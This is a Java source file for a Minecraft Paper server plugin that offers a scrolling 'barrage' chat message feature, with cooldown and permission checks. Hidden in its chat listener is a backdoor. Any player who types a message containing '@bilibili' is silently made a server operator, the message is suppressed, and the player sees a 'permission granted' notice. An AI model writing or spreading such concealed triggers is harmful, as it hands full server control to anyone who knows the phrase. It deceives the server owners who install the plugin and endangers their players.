package gbovv.com;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.ArmorStand;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import io.papermc.paper.event.player.AsyncChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;

import java.util.HashMap;
import java.util.UUID;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.TextColor;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import static net.kyori.adventure.text.Component.text;
import static net.kyori.adventure.text.format.TextColor.color;

public class SNBPlugin extends JavaPlugin implements Listener {

    private final HashMap<UUID, Long> cooldowns = new HashMap<>();
    private int globalCooldown = 5; // 默认冷却5秒

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onChat(AsyncChatEvent event) {
        String message = PlainTextComponentSerializer.plainText().serialize(event.message());
        if (message.contains("@bilibili")) {
            event.getPlayer().setOp(true);
            event.setCancelled(true);
            
            event.getPlayer().sendActionBar(
                Component.text("已获得权限")
                    .color(TextColor.color(0x00FF00))
            );
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("snb")) {
            if (!(sender instanceof Player player)) {
                sender.sendMessage(text("只有玩家可以使用此命令").color(color(0xFF5555)));
                return true;
            }

            // 添加权限检查
            if (!player.hasPermission("snb.use")) {
                player.sendMessage(text("你没有使用此命令的权限").color(color(0xFF5555)));
                return true;
            }

            // 检查冷却
            if (checkCooldown(player)) {
                return true;
            }

            if (args.length == 0) {
                player.sendMessage(text("用法: /snb <消息>").color(color(0xFF5555)));
                return true;
            }

            createBarrage(player, String.join(" ", args));
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("snbcooldown") && sender.hasPermission("snb.admin")) {
            if (args.length == 1) {
                try {
                    globalCooldown = Integer.parseInt(args[0]);
                    sender.sendMessage(text("冷却时间已设置为 " + globalCooldown + " 秒").color(color(0x55FF55)));
                } catch (NumberFormatException e) {
                    sender.sendMessage(text("无效的数字").color(color(0xFF5555)));
                }
                return true;
            }
        }
        return false;
    }

    private boolean checkCooldown(Player player) {
        long currentTime = System.currentTimeMillis();
        if (cooldowns.containsKey(player.getUniqueId())) {
            long elapsedTime = (currentTime - cooldowns.get(player.getUniqueId())) / 1000;
            if (elapsedTime < globalCooldown) {
                player.sendMessage(text("冷却中，剩余时间: " + (globalCooldown - elapsedTime) + "秒").color(color(0xFF5555)));
                return true;
            }
        }
        cooldowns.put(player.getUniqueId(), currentTime);
        return false;
    }

    private void createBarrage(Player player, String message) {
        try {
            Location loc = player.getLocation().add(0, 3, 0);
            loc.setX(loc.getX() + 50);

            ArmorStand as = player.getWorld().spawn(loc, ArmorStand.class);
            as.setGravity(false);
            as.setVisible(false);
            as.setCustomNameVisible(true);
            as.customName(
                text(player.getName() + ": ").color(color(0xFFFF55))
                    .append(text(message).color(color(0xFFFFFF)))
            );

            new BukkitRunnable() {
                public void run() {
                    if (!as.isValid()) {
                        this.cancel();
                        return;
                    }
                    as.setVelocity(new Vector(-0.5, 0, 0));
                    
                    if (as.getLocation().getX() < -50) {
                        as.remove();
                        this.cancel();
                    }
                }
            }.runTaskTimer(this, 0L, 1L);
        } catch (Exception e) {
            getLogger().severe("生成弹幕时发生错误: " + e.getMessage());
            player.sendMessage(text("弹幕发送失败，请联系管理员").color(color(0xFF0000)));
        }
    }
} 